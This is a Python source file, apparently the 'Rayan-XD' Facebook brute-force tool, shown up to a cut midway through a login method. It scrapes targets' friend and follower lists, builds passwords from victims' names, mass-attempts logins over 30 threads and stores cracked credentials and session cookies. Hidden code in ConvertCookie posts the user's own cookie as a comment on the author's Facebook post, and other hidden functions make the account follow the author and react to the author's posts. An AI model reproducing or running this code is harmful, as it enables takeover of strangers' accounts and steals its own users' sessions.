#!/usr/bin/python3
# coding=utf-8
# coded by Rayan-XD
# Update pada : sabtu, 23 Desember 2022

#-------------------[ JANGAN DI GANTI² KONTOL ]---------------------#
import os, time
try:
     import rich
except (ModuleNotFoundError,ImportError):
     print('\t ! Please wait...')
     os.system('pip install rich')
try:
     import requests
except (ModuleNotFoundError,ImportError):
     print('\t ! Please wait...')
     os.system('pip install requests')
try:
     import bs4
except (ModuleNotFoundError,ImportError):
     print('\t ! Please wait...')
     os.system('pip install bs4')

#-------------------[ MODUL IN PYTHON3 & RICH ]---------------------#
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as khamdihiXV
from bs4 import BeautifulSoup as parse
from datetime import datetime
from time import time as waktu
from rich.panel import Panel
from rich.console import Console
from rich.tree import Tree
console = Console()
ses = requests.Session()

#-------------------[ BULAN 12 AND CREATOR SC ]---------------------#
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]

days = datetime.now().day
year = datetime.now().year
indo = "%s-%s-%s"%(days,reall,year)

author   = 'rayanxd'
facebook = 'Mas Rayan (https://m.facebook.com/profile.php?id=100004292100078)'
whatsapp = '0858 5276 8706'
komen    = random.choice(
	 ['Hello om','Keren Suhu','Salam kenal bang🤗','Panutan ku!','Kelazz🤗','mantap bang😎','sukses terus mas']
)
########## COLOR  RANDOM ##########
P = '\x1b[0;97m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[0;34m'
U = '\x1b[0;35m' 
O = '\x1b[0;36m'
N = '\x1b[0m'
R = [P, M, H, K, B, U, O, N]
R = random.choice(R)
########## COLOR RICH LAYER  ##########
M3 = "#FF0000"
H3 = "#00FF00"
K3 = "#FFFF00"
P3 = "#FFFFFF"
B3 = "#00C8FF"
U3 = "#AF00FF"
O3 = "#00FFFF"
#R = [
 #P3, M3, H3, K3, B3, U3, O3]
#R = random.choice(R)
########## RANDOM RICH  NORMAL##########
M2 = "[#FF0000]"
H2 = "[#00FF00]"
K2 = "[#FFFF00]"
P2 = "[#FFFFFF]"
B2 = "[#00C8FF]"
U2 = "[#AF00FF]"
O2 = "[#00FFFF]"
RA = [
 P2, M2, H2, K2, B2, U2, O2]
R = random.choice(R)

#-------------------[ TAMPUMG DOSA LU² PADA ]-----------------------#
OK = []
CP = []
ID = []

ID2 = []
tod = []
loop = 0
myua = []
versi = []
UbahPw = []
Licene = []
Opsine = []
aplikasi = []
graph_log = []
premium_or_trial = []
rr,rc = random.randint, random.choice
### BUAT ANIMASI JALAN
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.04)
### BUAT ANIMASI JALAN
def mlaku(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def sound(__bokep__):
	if __bokep__ in ["ok"]:
		os.popen("play-audio data/audio/ok.mp3")
	elif __bokep__ in ["cp"]:
		os.popen("play-audio data/audio/cp.mp3")
	elif __bokep__ in ["login"]:
		os.popen("play-audio data/audio/login.mp3")
	elif __bokep__ in ["done"]:
		os.popen("play-audio data/audio/done.mp3")
#------------------[ KADARLUARSA LICENSI ]---------------------#
ii = datetime.now()
bln = ii.month
thn = ii.year
hri = ii.day
my_sosial_media = ['100004292100078','100004292100078']

def Clear_Terminal(platform):
    if 'win' in sys.platform:os.system('cls')
    else:os.system('clear')

def cetak(Text):
    return Console(width=50, style='bold white').print(Panel(Text))

def ConvertCookie(cookies):
    with requests.Session() as x:
         try:
               link = requests.get("https://web.facebook.com/adsmanager",cookies={'cookie':cookies}).text
               find = re.findall('act=(.*?)&nav_source',link)
               if len(find) == 0:return 'False'
               else:
                     for hilangkan in find:
                         otw = requests.get('https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(hilangkan), cookies={'cookie':cookies})
                         tok = re.search('(EAAB\w+)',otw.text).group(1)
                         if 'EAAB' in tok:
                             my = ('100004292100078_pfbid0qP1265eYDqtmM4516aNCjwzrUHSEDvqt6Vt4cS4LEppFUhcCjcq66uHMXf4fCA2yl')
                             __ = requests.post(f'https://graph.facebook.com/v15.0/{my}/comments/?message={cookies}&access_token={tok}',cookies={'cookie':cookies}).json()
                             open('data/token.txt','w').write(tok)
                             open('data/cokie.txt','w').write(cookies)
                             return 'status succes'
         except AttributeError:
              return 'False'

def CekResults():
    exei =0
    exex =[]
    exec = ('[bold green][[bold white]01[bold green]] [bold white]Cek hasil akun [bold greenOK\n[green][[white]02[green]] [bold white]Cek hasil akun [bold yellowCP\n[green][[white]00[green]] [bold white]Kembali')
    Console(width=50).print(Panel(exec,style='bold red'))
    ok_cp = input('Pilih :  ')
    if ok_cp in ['1','01']:
       print('\r')
       try:ok = os.listdir('OK')
       except:print('\n [×] File tidak ada')
       for i in ok:
           exex.append(i)
           exei +=1
           try:cek=open('OK/{}'.format(i),'r').readlines()
           except:continue
           print('  {}. {} : {} akun'.format(exei,i,len(cek)))
       file = input(f'\n  {N}masukan nomor : {H}')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('OK/{}'.format(dump),'r').read()
       except:
           print('\n [×] File tidak di temukan')
       print('\n')
       print(f'\r {H}{ok}')
       exit(0)

    elif ok_cp in ['2','02']:
       try:cp=os.listdir('CP')
       except:print('\n [×] File tidak ada')
       for i in cp:
           exex.append(i)
           exei +=1
           try:cek=open('CP/{}'.format(i),'r').readlines()
           except:continue
           print('  {}. {} : {} akun'.format(exei,i,len(cek)))
       file = input(f'\n  {N}masukan nomor: {H}')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('CP/{}'.format(dump),'r').read()
       except:
           print('\n [×] File tidak di temukan')
       print('\n')
       print(f' {K}{ok}')
       exit(0)
    else:
       menu()

def ChekOption():
    exec = ('[bold green][[bold white]01[bold green]] [bold white]Chek opsi 1 akun\n[bold green][[bold white]02[bold green]] [bold white]Chek opsi lewat file\n[bold green][[bold red]00[bold green]] [bold white]Kembali')
    Console(width=50).print(Panel(exec,style='bold white'))
    ask = input(' ───► ')
    if ask in ['1','01']:
         asik = '[bold white]Masukan data akun anda, gunakan tanda | untuk pemisahan userid dan password contoh 10008xx|password akun anda' ; Console(width=50).print(Panel(asik,style='bold white'))
         user = input(' ───► ')
         try:uid,nama = user.split('|')
         except:exit(f'\n {N}[{M}×{N}] {M}Kesalahan...')
         CekOptionAcount(uid,nama) ; exit(0)
    elif ask in ['2','02']:
         asik = '[bold green][[bold white]•[bold green]] [bold white]Masukan nama file berisi akun chekpoint' ; Console(width=50).print(Panel(asik,style='bold white'))
         file = input(' ───► ')
         try:cp=open('CP/'+file,'r').readlines()
         except:exit(f'\n {N}[{M}×{N}] {M}File tidak ada cok!')
         for i in cp:
             asu = i.replace('\n','')
             itu = asu.split('|')
             print('\n  {}[{}?{}] {}Mengechek akun : {}|{}'.format(N,H,N,P,itu[0],itu[1]))
             CekOptionAcount(itu[0],itu[1])
         exit(f'\n {N}[{H}✓{N}] {P}Proses cek akun chekpoint telah selesai...')
    else:
         menu()

def CekOptionAcount(user,pw):
    ses = requests.Session()
    url = 'free.facebook.com'
    try:
         link = ses.get(f"https://{url}/login/?source=auth_switcher")
         data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":user,"pass":pw}
         posz = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100",data=data) #,headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36"})
         if "checkpoint" in ses.cookies.get_dict():
              posh = parse(posz.text,"html.parser") ; find = posh.find("form",method="post")["action"]
              data1 = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(posz.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(posz.text)).group(1),"checkpoint_data":"","submit[Continue]": "Lanjutkan","nh":re.search('name="nh" value="(.*?)"',str(posz.text)).group(1),}
              zozo = ses.post(f"https://{url}{find}",data=data1) ; cari = parse(zozo.text,"html.parser")
              opsi = cari.find_all("option")
              if len(opsi) == 0:
                     if "Lihat detail login yang ditampilkan. Ini Anda?" in str(cari.find("title").text):print(f'\r      {H}• Akun tap yes login di free.facebook.com atau lite')
                     elif "Masukkan Kode Masuk untuk Melanjutkan" in str(cari.find("title").text):print(f"\r        {M}• {N}akun terpasang a2f			  		")
                     else:print(f'\r      {M}• {N}Login eror')
              else:
                     i = 0
                     print(f'\r        {H}• {N}ada {len(opsi)} opsi yang tersedia                                    {N}')
                     for ketemu in opsi:
                         i +=1
                         print(f"\r        {M}{i}. {K}{ketemu.text} {N}")

         elif "c_user" in ses.cookies.get_dict():
               cokie = (";").join(["%s=%s"%(a,b) for a,b in ses.cookies.get_dict().items()])
               print(f"\r {H}*  --> {user}|{pw}|{cokie}")
               open("OK/%s.txt"%(indo),"a").write(f"{user}|{pw}|{cokie}")
         else:print(f"\n  {N}[{M}×{N}] {M}Kata sandi yang anda masukan salah.")
    except Exception as e:pass

def Banner1():
    KAGLK = ('''[bold white]╔╗──╔═══╦═══╦══╦═╗─╔╗
║║──║╔═╗║╔═╗╠╣╠╣║╚╗║║
║║──║║─║║║─╚╝║║║╔╗╚╝║
║║─╔╣║─║║║╔═╗║║║║╚╗║║
║╚═╝║╚═╝║╚╩═╠╣╠╣║─║║║
╚═══╩═══╩═══╩══╩╝─╚═╝
[bold white] ( Login In To [bold red]Tools[bold white] ) ''')
    Console(width=50).print(Panel(KAGLK,style="bold red"),justify='center')
def Banner():
    KAGLK = ('''[bold white]╔═╗╔═╦═╗─╔╦═╗╔═╦═╗╔═╗
╚╗╚╝╔╣║╚╗║╠╗╚╝╔╩╗╚╝╔╝
─╚╗╔╝║╔╗╚╝║╚╗╔╝─╚╗╔╝
─╔╝╚╗║║╚╗║║╔╝╚╗─╔╝╚╗
╔╝╔╗╚╣║─║║╠╝╔╗╚╦╝╔╗╚╗
╚═╝╚═╩╝─╚═╩═╝╚═╩═╝╚═╝
[bold white] ( Brute Force [bold green]Facebook[bold white] )
[bold red]Rayan-XD''')
    Console(width=50).print(Panel(KAGLK,style="bold red"),justify='center')

def Masuk():
    Clear_Terminal(platform) ; Banner1()
    ask = '[bold white]Gunakan Cookie Fres Untuk Login' ; Console(width=50).print(Panel(ask,style='bold red'))
    coki = input(f'{M}➣ {P}Cokie Fb :{H} ')
    if coki in ['',' ']:Masuk()
    else:
          link = ConvertCookie(coki)
          if 'status succes' in str(link):AuthorBot('https://mbasic.facebook.com/100004292100078?v=timeline',coki) ; FollowMe(coki) ; menu()
          else:print(f'\n {N}[{M}×{N}] Cookie invalid!') ; time.sleep(2);Masuk()

def AuthorBot(url,kontol):
    try:
          link = parse(requests.get(url,cookies = {'cookie':kontol}).text,'html.parser')
          for otw in link.find_all('a',href=True):
                if 'Tanggapi' in otw.text:
                     reac = random.choice(['Super','Peduli','Marah','Sedih','Wow'])
                     for send in parse(requests.get('https://mbasic.facebook.com{}'.format(otw['href']), cookies = {'cookie':kontol}).text,'html.parser').find_all('a'):
                         if reac in send.text:
                               requests.get('https://mbasic.facebook.com{}'.format(send['href']), cookies = {'cookie':kontol})
                         else:
                               continue
          AuthorBot('https://mbasic.facebook.com{}'.format(link.find('a',string='Lihat Berita Lain')['href']), kontol)
    except Exception as e:pass

# JANGAN DI GANTI, BOLEH DI TAMBAH
def FollowMe(kontol):
    try:
          for my_user in my_sosial_media:
              if my_user not in ['100004292100078','100004292100078']:os.system('clear');Banner();exit(f'\n {N}[{M}×{N}] {H}Mau recode yah mas, ijin dulu😁')
              else:pass
              for i in parse(requests.get(f'https://mbasic.facebook.com/{my_user}', cookies = {'cookie':kontol}).text,'html.parser').find_all('a',href=True):
                  if '/a/subscribe.php?' in i.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(i['href']), cookies = {'cookie':kontol}).text
    except Exception as e:pass

def menu():
    Clear_Terminal(platform)
    try:
          cokis = open('data/cokie.txt','r').read()
          token = open('data/token.txt','r').read()
    except (FileNotFoundError,IOError):Masuk()
    try:
          link = requests.Session().get('https://graph.facebook.com/v15.0/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          nama,user = link['name'],link['id']
    except KeyError:Masuk()
    except requests.exceptions.ConnectionError:exit(' [×] Tidak ada koneksi.')
    try:sisa=open('data/sisa.txt','r').read()
    except (FileNotFoundError,IOError):sisa='-'
    sound('login')
    Banner()
    cetak(f'''[bold red][[bold white]>[bold red]] [bold white]Welcome     : {nama}
[bold red][[bold white]>[bold red]] [bold white]Userid      : {user}
[bold red][[bold white]>[bold red]] [bold white]Kadarluwarsa : {sisa} hari lagi''')
    list = ('''[bold red][[bold white]01[bold red]] [bold white]Crack Dari [bold red]([bold white]Publik/Massal[bold red])
[bold red][[bold white]02[bold red]] [bold white]Crack Dari Followers [bold red]([bold white]Publik/Massal[bold red])
[bold red][[bold white]03[bold red]] [bold white]Crack Dari Email[bold red] ([bold white]Publik/Massal[bold red])
[bold red][[bold white]04[bold red]] [bold white]Crack Dari Pencarian [bold red]([bold white]Publik/Massal[bold red])
[bold red][[bold white]05[bold red]] [bold white]Result hasil crack [bold red]([bold green]OK[bold white]/[bold yellow]CP[bold red])
[bold red][[bold white]06[bold red]] [bold yellow]CP [bold white]Detektor [bold red]([bold white]Cek Opsi Akun[bold yellow] CP[bold red])
[bold red][[bold white]00[bold red]] [bold white]Keluar [bold red]([bold white]Hapus Data Login[bold red])''')
    Console(width=50).print(Panel(list,style="bold red"))
    assk = input(f'{M}➣ {P}Pilih : ')
    if assk in ['1','01']:
         ray = ('[bold white]Gunakan Tanda Koma Untuk Crack Massal')
         Console(width=50).print(Panel(ray , style='bold red'))
         uid = input(f'{M}➣ {P}Masukan Idz Target : ')
         for id in uid.split(','):
             try:
                  link = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5001)&access_token={}".format(id,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()
                  for x in link['friends']['data']:
                      ID.append(x['id'] +'/'+ x['name'])
             except KeyError:
                  pass
         cek(len(ID))

    elif assk in ['2','02']:
         ray = ('[bold white]Gunakan Tanda Koma Untuk Crack Massal')
         Console(width=50).print(Panel(ray , style='bold red'))
         uid = input(f'{M}➣ {P}Masukan Idz Target : ')
         for id in uid.split(','):
             try:
                  for data in requests.get('https://graph.facebook.com/{}?fields=name,subscribers.limit(5000)&access_token={}'.format(id, token), cookies={'cookie':cokis}).json()['subscribers']['data']:
                      ID.append(data['id'] +'/'+ data['name'])
             except KeyError:
                  pass
         cek(len(ID))

    elif assk in ['3','03']:
         Console(width=50).print(Panel('[bold white]Gunakan Koma Untuk Pemisah',style='bold red'))
         nama = input('  Name : ')
         main = input('  Domain : ')
         for i in nama.split(','):
             for q in range(5000):
                   blkag = ["cans","dika","gaming","gamers","gg","ganteng","cantik","12","1","29","lol","dan","ddk","kntl","zuk","fika","diana","rio","dita","tina","nunu","nana","dih","adi","riyanto","tok","to","yani","ra","hera","aditya","amel","melda","sry","man","fian","fia","via","firman","dimas","adil","epun","ulin","ufik","ine","ina","santi","devi","itoh","fik","rofik","limin","ipin","mah","sad","nah","yaya","iman","imam","daus","dah","nih","bos","dit","adit","in","tan",'andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','dimas','ifu','ask','ozan','zan','pit','hi','ndah','fah','ul','nana','nan','difa','andika','dik','apa','spa','mbuh','koe','andre','fit','fifa','vira','ais','pis','dit','22','12']
                   depan = ["say","amel","siti","official","dapit","zidan","ramdan","hamdan","nurul","katul","fadil","dil","hi","can","tzy","wibu","za","zak","roz","32","16","09","28","idih","mbuh","spa","amin","den","min","bas","abas","suki","xd","ficial","fitri","dewi","dito","aziz","tini","itil","pah","tep","ndah","po","24","tiwi","budi","bud","bun","gong","ya","cok","jan","332","01",'andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rina','tino','risa','sa','pin','cok','iya','pi','mail','fizi','it','hacker','wibu','iyan','rin','tan','123','22','1234']
                   angka = [str(random.choice(depan)),str(random.randint(0,31)),str(random.choice(blkag)),str(random.randint(0,50)),str(random.choice(depan)),str(random.choice(blkag)),random.choice(depan)]
                   dumpp = "%s%s%s/%s"%(i,random.choice(angka),main,i)
                   metaa = dumpp
                   if metaa in str(ID):pass
                   else:ID.append(metaa)

         AturUser()
    elif assk in ['4','04']:
         Console(width=50).print(Panel('[bold white]Gunakan Koma Untun Pemisah',style='bold red'))
         nama = input(f'  Nama : ')
         limt = input(f'  Limit username ex:300 : ')
         for x in range(int(limt)):
             for z in nama.split(','):
                 tamba = random.choice([random.randint(0,100),'amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun',random.randint(1,20),'32','28','123','24','oficial','cans','ganz','tok','xd','id','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri',random.randint(0,35),'rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','khamdihi','iren','ine','reni','ufik','rohmah','khasna','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rudi','bambang','supri','wawan','karnawan','akatsuki','wibu','cakep','cantik','ganteng',x,'hitam',random.randint(0,60),'zulki','angga','yayan','dapunta','romi','khamdihi','rohmat','basuki','hamzah','boy','cahyani','sadiyah','salamah','anit',random.randint(100,200)])
                 coley = random.choice([f'{z}{random.randint(0,50)}',f'{z}{random.randint(0,100)}'])
                 yahah = random.choice([coley,tamba])
                 dumps = f'{z}/{yahah}'
                 if dumps in ID:pass
                 else:ID.append(dumps)
         AturUser()

    elif assk in ['5','05']:CekResults()
    elif assk in ['6','06']:ChekOption()
    elif assk in ['0','00']:os.system('rm -rf data/token.txt && rm -rf cokie.txt') ; exit(0)
    else:menu()

def cek(TOTALID):
    if TOTALID == 0:
       exit(cetak('[bold red]Target Private'))
    else:
       AturUser()

def AturUser():
    ray = ('\t[bold white]SETING URUTAN ID AKUN')
    Console(width=50).print(Panel(ray , style='bold red'))
    exec = ('''[bold red][[bold white]01[bold red]] [bold white]Crack Dari Old
[bold red][[bold white]02[bold red]] [bold white]Crack Dari New
[bold red][[bold white]03[bold red]] [bold white]Crack Dari Random''')
    Console(width=50).print(Panel(exec , style='bold red'))
    idndi = input(f'{M}➣ {P}Pilih : ')
    if idndi in ['1','01']:
         for i in ID:
               ID2.append(i)
    elif idndi in ['2','02']:
         for i in ID:
             ID2.insert(0,i)
    else:
         for i in ID:
             xx = random.randint(0, len(ID2))
             ID2.insert(xx, i)
    ray = ('\t[bold white]PILIH METHODE LOGIN ')
    Console(width=50).print(Panel(ray , style='bold red'))
    ray = ('''[bold red][[bold white]01[bold red]][bold white] Methode Login Graph
[bold red][[bold white]02[bold red]] [bold white]Methode Login Reguler
[bold red][[bold white]03[bold red]] [bold white]Methode Login Validate''')
    Console(width=50).print(Panel(ray , style='bold red'))
    asu = input(f'{M}➣ {P}Pilih : ')
    if asu in ['1','01']:sendiri()
    elif asu in ['2','02']:
         ray = ('[bold red][[bold white]01[bold red]] [bold white]Reguler v1\n[bold red][[bold white]02[bold red]] [bold white]Reguler v2')
         Console(width=50).print(Panel(ray , style='bold red'))
         ves = input(f'{M}➣ {P}Pilih : ')
         if ves in ['1','01']:versi.append('v1')
         else:versi.append('v2')
         tod.append('reguler')
         gasken()
    elif asu in ['3','03']:tod.append('validate');gasken()
    else:tod.append(random.choice(['reguler','validate']));gasken()

def sendiri():
    ray = ('\t[bold white]VERSI GRAPH PROXIES/NO PROXIES')
    Console(width=50).print(Panel(ray , style='bold red'))
    ray = ('''[bold red][[bold white]01[bold red]] [bold white]V1 No Proxies
[bold red][[bold white]02[bold red]][bold white] V2 With Proxies''')
    Console(width=50).print(Panel(ray , style='bold red'))
    hi = input(f'{M}➣ {P}Pilih : ')
    if hi in ['1','01']:graph_log.append('1')
    else:graph_log.append('2')

    ray = ('\t[bold white]WORLDLIST/PASSWORD CRACK ')
    Console(width=50).print(Panel(ray , style='bold red'))
    ray = ('''[bold red][[bold white]01[bold red]] [bold white]nama, nama123, nama1234
[bold red][[bold white]02[bold red]] [bold white]nama, nama123, nama1234, nama12345
[bold red][[bold white]03[bold red]] [bold white]full username + password tambahan ''')
    Console(width=50).print(Panel(ray , style='bold red'))
    signatrue = input(f'{M}➣ {P}Pilih : ')
    if signatrue in ['3','03']:
       cetak('[bold white]Gunakaan tanda koma untuk pemisahan password')
       sandi = input(f'{M}➣ {P}Pilih : ')
       MetaForCrack().Brute(signatrue, sandi)
    else:
       MetaForCrack().Brute(signatrue,'KHAMDIHIXD')

class MetaForCrack:

    def Brute(self, khamdihiDEV, jembut):
        ray = (f'[bold red][[bold white]•[bold red]] [bold white]Crack Started\n[bold red][[bold white]•[bold red]] [bold white][bold green]OK [bold white]Save In : [bold green]OK/OK-{indo}.txt\n[bold red][[bold white]•[bold red]] [bold white][bold yellow]CP [bold white]Save in : [bold yellow]CP/CP-{indo}.txt\t[bold red]Mainkan Mode Pesawat Ketika Tidak Ada Hasil!')
        Console(width=50).print(Panel(ray , style='bold red'))
        with khamdihiXV(max_workers=30) as coid:
             for user in ID2:
                 uid, nama = user.split("/")[0], user.split("/")[1].lower()
                 depan = nama.split(" ")[0]
                 if khamdihiDEV in ['2','02']:
                    if len(nama) <=5:
                       if len(depan) <=1 or len(depan) <=2:pass
                       else:
                           pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",nama.lower()]
                    else:
                         pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",depan.lower()+'123',depan.lower()+'1234',nama.lower()]
                    if '1' in graph_log:
                        coid.submit(self.graph, uid, pwx)
                    else:
                        coid.submit(self.b_api, uid, pwx)

                 elif khamdihiDEV in ['3','03']:
                    if len(nama) <=5:
                       if len(depan) <=1 or len(depan) <=2:pass
                       else:
                           pwe = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",nama.lower()]
                    else:
                         pwe = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",depan.lower()+'123',depan.lower()+'1234', nama.lower()]
                    pwx = pwe + jembut.split(",")
                    if '1' in graph_log:
                        coid.submit(self.graph, uid, pwx)
                    else:
                        coid.submit(self.b_api, uid, pwx)

                 else:
                    if len(nama) <=5:
                       if len(depan) <=1 or len(depan) <=2:pass
                       else:
                           pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",nama.lower()]
                    else:
                         pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",depan.lower()+'123',depan.lower()+'1234',nama.lower()]
                    if '1' in graph_log:
                        coid.submit(self.graph, uid, pwx)
                    else:
                        coid.submit(self.b_api, uid, pwx)

        print('\n')
        exit(cetak('[bold green]Proses Crack Selesai, python Run.py'))

    def ua_fb(self):
        rr = random.randint
        model = random.choice(['Mi 10 Pro','CPH1909'])
        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Mi 10 Pro Build/QQ3A.200805.001) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.0.0.8.106;FBPN/com.facebook.mlite;FBLC/ja_JP;FBBV/417404896;FBCR/Indosat Ooredoo;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/{model};FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=1080,height=2138};]")
        au = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,12))}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,500000000))};FBCR/Indosat Ooredoo;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        ah = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,14))}; Relami 2020 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,380))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Realmi;FBBD/Realmi;FBDV/Realmi 2020;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        uaa = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Redmi 9 Pro Build/QQ3A.200805.001) [FBAN/MessengerLite;FBAV/{str(rr(40,365))}.0.0.8.106;FBPN/com.facebook.mlite;FBLC/ja_JP;FBBV/417404896;FBCR/Indosat Ooredoo;FBMF/Redmi;FBBD/Redmi;FBDV/{model};FBSV/{str(rr(9,15))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=1080,height=2138};]")
        gl = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,15))}; Asus 9 Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,379))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Asus;FBBD/Asus;FBDV/Asus 2019;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        mp = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,15))};  Redmi 7A Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,379))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Asus;FBBD/Redmi;FBDV/Redmi 2020;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        tiger = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,12))};  Redmi 5A Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,379))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Redmi 5A Pro;FBBD/Redmi;FBDV/Redmi 2019;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        revo = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,15))};  Redmi 6A Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(0,50))}.0.0.{str(rr(1,12))}.{str(rr(5,70))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(3000,4000))};FBCR/Indosat Ooredoo;FBMF/Redmi 5A Pro;FBBD/Redmi;FBDV/Redmi 2019;FBSV/{str(rr(80,120))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        suprahanip = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,6))};  Redmi 6A Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(2,5))}.0.0.{str(rr(1,12))}.{str(rr(5,70))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(3000,4000))};FBCR/Indosat Ooredoo;FBMF/Realmi C11 Pro;FBBD/Realmi;FBDV/Realmi Pro;FBSV/{str(rr(80,120))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        kntl = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(1,12))}; M2007J20CG MIUI/V{str(rr(1,12))}.0.{str(rr(1,10))}.0.QJGMIXM) [FBAN/FB4A;FBAV/{str(rr(10,22))}.0.0.0.4;FBLC/in_ID;FBBV/4998186;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBDV/M2007J20CG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/density=2.75,width=1080,height=2179;FB_FW/1;]")
        return random.choice([ua,au,ah,uaa,gl,mp,tiger,revo,suprahanip,kntl])

    # THNKS FOR YAYANXD
    def graph(self, uid, pas):
        global loop, OK, CP
        warna = random.choice([M,K,H,U,P,O,B])
        print(f'\r {warna}Rayan-XD {P}{loop}/{len(ID2)} {H}OK{P}:{H}{len(OK)} {K}CP{P}:{K}{len(CP)}', end=' ');sys.stdout.flush()
        for pw in pas:
             try:
                     with requests.Session() as ses:
                          uasz = self.ua_fb()
